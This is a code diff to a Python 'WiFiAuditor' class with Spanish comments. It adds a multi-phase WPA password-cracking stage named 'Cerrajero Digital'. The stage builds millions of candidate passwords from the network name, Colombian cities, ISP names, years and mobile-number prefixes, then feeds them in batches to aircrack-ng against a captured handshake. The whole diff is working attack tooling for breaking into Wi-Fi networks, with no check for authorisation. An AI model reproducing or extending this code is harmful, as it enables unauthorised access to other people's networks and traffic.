@@ -2375,7 +2375,7 @@ class WiFiAuditor:
         return None
 
     def crack_handshake(self, target, handshake_file):
-        """Sistema de cracking masivo inteligente con aprendizaje adaptativo"""
+        """Sistema de cracking masivo inteligente con aprendizaje adaptativo + Cerrajero Digital"""
         self.log(f"Iniciando sistema de cracking masivo inteligente: {target['essid']}", "INFO")
         
         # Verificar archivo
@@ -2425,7 +2425,13 @@ class WiFiAuditor:
         
         # FASE 6: Última oportunidad - cracking paralelo masivo
         self.log("FASE 6: Cracking paralelo masivo (ultimo recurso)...", "INFO")
-        return self.parallel_massive_attack(target, handshake_file)
+        password = self.parallel_massive_attack(target, handshake_file)
+        if password:
+            return password
+            
+        # FASE 7: CERRAJERO DIGITAL - Máximo uso de RAM
+        self.log("FASE 7: CERRAJERO DIGITAL - Usando toda la RAM disponible...", "WARNING")
+        return self.digital_lockpicker_ram_max(target, handshake_file)
     
     def massive_password_generation_attack(self, target, handshake_file):
         """Generar y probar miles de contraseñas inteligentemente"""
@@ -3656,6 +3662,452 @@ class WiFiAuditor:
             
         except Exception as e:
             self.log(f"Error en {method_name}: {e}", "WARNING")
+        finally:
+            # Limpiar archivo temporal
+            try:
+                os.remove(temp_file)
+            except:
+                pass
+        
+        return None
+    
+    def digital_lockpicker_ram_max(self, target, handshake_file):
+        """FASE 7: CERRAJERO DIGITAL - Máximo aprovechamiento de RAM (23GB disponibles)"""
+        try:
+            import psutil
+        except ImportError:
+            self.log("psutil no disponible - usando valores por defecto", "WARNING")
+            available_ram_gb = 8
+            cpu_cores = 4
+        else:
+            # Detectar recursos disponibles
+            available_ram_gb = psutil.virtual_memory().available // (1024**3)
+            cpu_cores = psutil.cpu_count(logical=True) or 4
+        
+        self.log("=== CERRAJERO DIGITAL ACTIVADO ===", "WARNING")
+        self.log("Sistema cerrajero digital de máximo rendimiento", "INFO")
+        self.log(f"RAM disponible: {available_ram_gb}GB | CPU cores: {cpu_cores}", "SUCCESS")
+        self.log("Generando millones de contraseñas optimizadas en memoria", "INFO")
+        
+        # Estrategia del cerrajero digital: probar cerraduras más probables primero
+        lockpicker_phases = [
+            ("Ganzua Rapida", self._lockpicker_fast_picks, 50000),      # Intentos obvios
+            ("Llave Maestra", self._lockpicker_master_keys, 200000),     # Patrones maestros
+            ("Tension Precisa", self._lockpicker_precise_tension, 500000), # Variaciones precisas
+            ("Manipulacion Masiva", self._lockpicker_massive_manipulation, 2000000), # Fuerza inteligente
+            ("Martillo Digital", self._lockpicker_digital_hammer, 5000000), # Fuerza total
+            ("Arsenal Nuclear", self._lockpicker_nuclear_arsenal, 10000000) # Última esperanza
+        ]
+        
+        for phase_name, phase_function, max_passwords in lockpicker_phases:
+            if not self.running:
+                break
+                
+            self.log(f"CERRAJERO: {phase_name} (hasta {max_passwords:,} intentos)", "INFO")
+            
+            try:
+                # Generar contraseñas para esta fase
+                password_generator = phase_function(target, max_passwords)
+                
+                # Usar procesamiento optimizado
+                password = self._parallel_lockpicking(target, handshake_file, password_generator, cpu_cores, phase_name)
+                if password:
+                    self.log(f"CERRADURA ABIERTA con {phase_name}", "SUCCESS")
+                    return password
+                
+                self.log(f"{phase_name} completado sin exito - probando siguiente tecnica", "INFO")
+                
+            except Exception as e:
+                self.log(f"Error en {phase_name}: {e}", "WARNING")
+                continue
+        
+        self.log("Cerradura resistente a todas las tecnicas de cerrajeria", "WARNING")
+        return None
+    
+    def _lockpicker_fast_picks(self, target, max_count):
+        """Ganzúa rápida - intentos obvios como un cerrajero experto"""
+        essid = target['essid']
+        passwords = set()
+        
+        # Variaciones de capitalización del ESSID
+        essid_variations = [
+            essid,                    # Original
+            essid.lower(),           # minusculas
+            essid.upper(),           # MAYUSCULAS
+            essid.capitalize(),      # Primera mayuscula
+            essid.title(),           # Primera De Cada Palabra
+        ]
+        
+        # Patrones más comunes
+        common_suffixes = ['123', '1234', '12345', '123456', '2024', '2023', '2022', '2021', '0000', '1111']
+        common_prefixes = ['123', '2024', '2023', 'admin', 'wifi']
+        
+        # Generar combinaciones obvias
+        for base in essid_variations:
+            if not base or len(base) < 2:
+                continue
+                
+            # Sufijos
+            for suffix in common_suffixes:
+                candidate = base + suffix
+                if 8 <= len(candidate) <= 63:
+                    passwords.add(candidate)
+            
+            # Prefijos
+            for prefix in common_prefixes:
+                candidate = prefix + base
+                if 8 <= len(candidate) <= 63:
+                    passwords.add(candidate)
+            
+            # Duplicaciones
+            if len(base) >= 4 and len(base) <= 30:
+                passwords.add(base + base[:4])  # essid + primeros 4 chars
+        
+        # Añadir patrones numericos incrementales
+        for base in essid_variations[:3]:  # Solo las 3 primeras variaciones
+            for i in range(100):
+                if len(passwords) >= max_count:
+                    break
+                candidates = [
+                    f"{base}{i:02d}",
+                    f"{base}{i:03d}", 
+                    f"{i:02d}{base}",
+                    f"{base}20{i:02d}" if i <= 24 else f"{base}19{i:02d}"
+                ]
+                for candidate in candidates:
+                    if 8 <= len(candidate) <= 63:
+                        passwords.add(candidate)
+        
+        return (pwd for pwd in passwords if len(pwd) >= 8 and len(pwd) <= 63)
+    
+    def _lockpicker_master_keys(self, target, max_count):
+        """Llaves maestras - patrones que abren muchas cerraduras"""
+        essid = target['essid']
+        passwords = set()
+        
+        # Patrones maestros colombianos con variaciones de capitalización
+        master_base = [
+            'colombia', 'bogota', 'medellin', 'cali', 'barranquilla',
+            'claro', 'movistar', 'tigo', 'une', 'etb', 'virgin', 'wom',
+            'internet', 'wifi', 'casa', 'hogar', 'familia', 'admin',
+            'password', 'contrasena', 'clave'
+        ]
+        
+        # Generar variaciones con capitalización
+        master_patterns = []
+        for base in master_base:
+            master_patterns.extend([
+                base,                # original
+                base.lower(),        # minuscula 
+                base.upper(),        # MAYUSCULA
+                base.capitalize(),   # Capitalizada
+                base.title()         # Title Case
+            ])
+        
+        # Variaciones del ESSID
+        essid_vars = [
+            essid, essid.lower(), essid.upper(), 
+            essid.capitalize(), essid.title()
+        ]
+        
+        # Años comunes (más focalizado)
+        years = list(range(1980, 2025))  # Rango más realista
+        
+        # Generar combinaciones maestras
+        for master in master_patterns:
+            if len(passwords) >= max_count:
+                break
+                
+            # Solo con años
+            for year in years[:20]:  # Solo los primeros 20 años
+                combos = [
+                    f"{master}{year}",
+                    f"{year}{master}",
+                    f"{master}{year % 100:02d}",
+                    f"{master}{str(year)[-2:]}"
+                ]
+                for combo in combos:
+                    if 8 <= len(combo) <= 63:
+                        passwords.add(combo)
+        
+        # Combinaciones con ESSID
+        for essid_var in essid_vars[:3]:  # Solo 3 variaciones del ESSID
+            for master in master_patterns[:10]:  # Solo los primeros 10 patrones
+                if len(passwords) >= max_count:
+                    break
+                combos = [
+                    f"{essid_var}{master}",
+                    f"{master}{essid_var}",
+                    f"{essid_var}{master}123",
+                    f"{master}{essid_var}2024"
+                ]
+                for combo in combos:
+                    if 8 <= len(combo) <= 63:
+                        passwords.add(combo)
+        
+        # Números de teléfono colombianos (más selectivo)
+        phone_prefixes = ['300', '301', '302', '310', '311', '312', '313', '314', '315', '320']
+        for prefix in phone_prefixes[:5]:  # Solo 5 prefijos
+            for i in range(1000000, 1005000):  # Rango menor
+                if len(passwords) >= max_count:
+                    break
+                phone = f"{prefix}{str(i)[1:]}"
+                if len(phone) >= 8:
+                    passwords.add(phone)
+        
+        return (pwd for pwd in passwords if 8 <= len(pwd) <= 63)
+    
+    def _lockpicker_precise_tension(self, target, max_count):
+        """Tensión precisa - variaciones exactas del ESSID"""
+        essid = target['essid']
+        passwords = set()
+        
+        # Generar todas las combinaciones posibles con el ESSID
+        base_variations = [
+            essid, essid.lower(), essid.upper(), essid.capitalize(),
+            essid.replace(' ', ''), essid.replace('-', ''), essid.replace('_', '')
+        ]
+        
+        # Sufijos precisos
+        suffixes = []
+        for i in range(100000):
+            suffixes.extend([f"{i:05d}", f"{i:04d}", f"{i:03d}", f"{i:02d}", str(i)])
+        
+        for base in base_variations:
+            for suffix in suffixes:
+                if len(passwords) >= max_count:
+                    break
+                combos = [f"{base}{suffix}", f"{suffix}{base}"]
+                passwords.update(c for c in combos if 8 <= len(c) <= 63)
+        
+        return (pwd for pwd in passwords if len(pwd) >= 8)
+    
+    def _lockpicker_massive_manipulation(self, target, max_count):
+        """Manipulación masiva - generación alfanumérica intensa"""
+        import string
+        import random
+        
+        essid = target['essid']
+        passwords = set()
+        
+        # Variaciones del ESSID
+        essid_variations = [
+            essid.replace(' ', '').replace('-', '').replace('_', ''),
+            essid.replace(' ', '').replace('-', '').replace('_', '').lower(),
+            essid.replace(' ', '').replace('-', '').replace('_', '').upper(),
+            essid.replace(' ', '').replace('-', '').replace('_', '').capitalize()
+        ]
+        
+        # Caracteres para generar
+        chars_lower = string.ascii_lowercase + string.digits
+        chars_mixed = string.ascii_letters + string.digits
+        
+        # Generar patrones con más control
+        for essid_var in essid_variations:
+            if not essid_var or len(essid_var) < 2:
+                continue
+                
+            # Patrones con sufijos numéricos
+            for i in range(1000):
+                if len(passwords) >= max_count:
+                    break
+                    
+                candidates = [
+                    f"{essid_var}{i:03d}",
+                    f"{essid_var}{i:04d}", 
+                    f"{i:03d}{essid_var}",
+                    f"{essid_var}20{i:02d}" if i <= 99 else f"{essid_var}{i}"
+                ]
+                
+                for candidate in candidates:
+                    if 8 <= len(candidate) <= 63:
+                        passwords.add(candidate)
+            
+            # Patrones alfanuméricos aleatorios pero controlados
+            for length in [8, 9, 10, 11, 12]:
+                needed_chars = length - len(essid_var)
+                if needed_chars <= 0 or needed_chars > 8:
+                    continue
+                
+                # Generar sufijos de longitud controlada
+                for _ in range(min(1000, max_count // 10)):
+                    if len(passwords) >= max_count:
+                        break
+                    
+                    # Usar tanto minúsculas como mayusculas
+                    char_set = chars_mixed if random.random() > 0.5 else chars_lower
+                    suffix = ''.join(random.choices(char_set, k=needed_chars))
+                    
+                    candidates = [essid_var + suffix, suffix + essid_var]
+                    for candidate in candidates:
+                        if 8 <= len(candidate) <= 63:
+                            passwords.add(candidate)
+        
+        return (pwd for pwd in passwords if 8 <= len(pwd) <= 63)
+    
+    def _lockpicker_digital_hammer(self, target, max_count):
+        """Martillo digital - fuerza bruta inteligente masiva"""
+        import random
+        import string
+        
+        passwords = set()
+        essid = target['essid'].replace(' ', '').lower()
+        
+        # Caracteres para generar
+        chars = string.ascii_lowercase + string.digits
+        
+        # Generar millones de contraseñas
+        for _ in range(max_count):
+            if len(passwords) >= max_count:
+                break
+            
+            # Estrategias múltiples
+            strategies = [
+                lambda: essid + ''.join(random.choices(chars, k=random.randint(2, 8))),
+                lambda: ''.join(random.choices(chars, k=random.randint(2, 6))) + essid,
+                lambda: ''.join(random.choices(string.digits, k=8)),
+                lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12))),
+                lambda: essid[:4] + ''.join(random.choices(string.digits, k=4))
+            ]
+            
+            strategy = random.choice(strategies)
+            password = strategy()
+            
+            if 8 <= len(password) <= 63:
+                passwords.add(password)
+        
+        return (pwd for pwd in passwords if len(pwd) >= 8)
+    
+    def _lockpicker_nuclear_arsenal(self, target, max_count):
+        """Arsenal nuclear - última esperanza con máximo poder computacional"""
+        import random
+        import string
+        
+        self.log("ARSENAL NUCLEAR ACTIVADO - Usando toda la RAM disponible", "WARNING")
+        
+        passwords = set()
+        all_chars = string.ascii_letters + string.digits + '!@#$%^&*()_+-='
+        
+        # Generar contraseñas completamente aleatorias pero priorizando patrones comunes
+        for length in [8, 9, 10, 11, 12]:
+            for _ in range(max_count // 5):
+                if len(passwords) >= max_count:
+                    break
+                
+                # 70% probabilidad de incluir ESSID, 30% completamente random
+                if random.random() < 0.7:
+                    essid_part = target['essid'].replace(' ', '')[:6].lower()
+                    remaining = length - len(essid_part)
+                    if remaining > 0:
+                        random_part = ''.join(random.choices(all_chars, k=remaining))
+                        password = essid_part + random_part
+                    else:
+                        password = essid_part[:length]
+                else:
+                    password = ''.join(random.choices(all_chars, k=length))
+                
+                if 8 <= len(password) <= 63:
+                    passwords.add(password)
+        
+        return (pwd for pwd in passwords if len(pwd) >= 8)
+    
+    def _parallel_lockpicking(self, target, handshake_file, password_generator, num_processes, phase_name):
+        """Cerrajería paralela - múltiples cerrajeros trabajando simultáneamente"""
+        self.log(f"Desplegando {num_processes} cerrajeros en paralelo para {phase_name}", "INFO")
+        
+        # Lotes optimizados según la fase
+        batch_sizes = {
+            "Ganzua Rapida": 5000,
+            "Llave Maestra": 10000,
+            "Tension Precisa": 15000,
+            "Manipulacion Masiva": 20000,
+            "Martillo Digital": 25000,
+            "Arsenal Nuclear": 30000
+        }
+        
+        batch_size = batch_sizes.get(phase_name, 10000)
+        batch_count = 0
+        max_batches_per_phase = {
+            "Ganzua Rapida": 10,       # Máximo 10 lotes
+            "Llave Maestra": 20,       # Máximo 20 lotes  
+            "Tension Precisa": 35,     # Máximo 35 lotes
+            "Manipulacion Masiva": 100, # Máximo 100 lotes
+            "Martillo Digital": 200,   # Máximo 200 lotes
+            "Arsenal Nuclear": 350     # Máximo 350 lotes
+        }
+        
+        max_batches = max_batches_per_phase.get(phase_name, 100)
+        
+        try:
+            while batch_count < max_batches and self.running:
+                try:
+                    batch = list(itertools.islice(password_generator, batch_size))
+                    if not batch:
+                        break
+                        
+                    batch_count += 1
+                    
+                    # Mostrar progreso cada 5 lotes para no saturar los logs
+                    if batch_count % 5 == 0 or batch_count <= 3:
+                        self.log(f"Cerrajero trabajando en lote {batch_count}/{max_batches} ({len(batch)} intentos)", "INFO")
+                    
+                    # Probar lote actual
+                    password = self._test_lockpicker_batch(target, handshake_file, batch, f"{phase_name}_lote_{batch_count}")
+                    if password:
+                        return password
+                    
+                    # Mostrar progreso total cada 10 lotes
+                    if batch_count % 10 == 0:
+                        total_tested = batch_count * batch_size
+                        self.log(f"Total probadas en {phase_name}: {total_tested:,} contraseñas", "INFO")
+                        
+                except Exception as batch_error:
+                    self.log(f"Error en lote {batch_count}: {batch_error}", "WARNING")
+                    continue
+            
+        except Exception as e:
+            self.log(f"Error en cerrajería paralela {phase_name}: {e}", "WARNING")
+        
+        return None
+    
+    def _test_lockpicker_batch(self, target, handshake_file, passwords, batch_name):
+        """Probar un lote de contraseñas con técnicas de cerrajero"""
+        if not passwords:
+            return None
+        
+        # Crear archivo temporal optimizado
+        temp_file = f"/tmp/lockpicker_{batch_name}_{int(time.time())}.txt"
+        
+        try:
+            # Escribir contraseñas de forma eficiente
+            with open(temp_file, 'w', buffering=8192) as f:
+                for pwd in passwords:
+                    if isinstance(pwd, str) and 8 <= len(pwd) <= 63:
+                        f.write(pwd + '\n')
+            
+            # Medir tiempo como un cerrajero profesional
+            start_time = time.time()
+            
+            # Usar aircrack-ng con optimizaciones
+            crack_cmd = f"aircrack-ng -w {temp_file} {handshake_file}"
+            success, output, error = self.run_command(crack_cmd, timeout=600)  # 10 minutos por lote
+            
+            end_time = time.time()
+            
+            self.log(f"Lote {batch_name}: {end_time - start_time:.2f}s ({len(passwords)} intentos)", "INFO")
+            
+            if success and "KEY FOUND" in output:
+                # Extraer la contraseña exitosa
+                import re
+                key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
+                match = re.search(key_pattern, output)
+                if match:
+                    password = match.group(1).strip()
+                    self.log(f"CERRADURA ABIERTA POR CERRAJERO: {password}", "SUCCESS")
+                    return password
+            
+        except Exception as e:
+            self.log(f"Error en lote {batch_name}: {e}", "WARNING")
         finally:
             # Limpiar archivo temporal
             try:
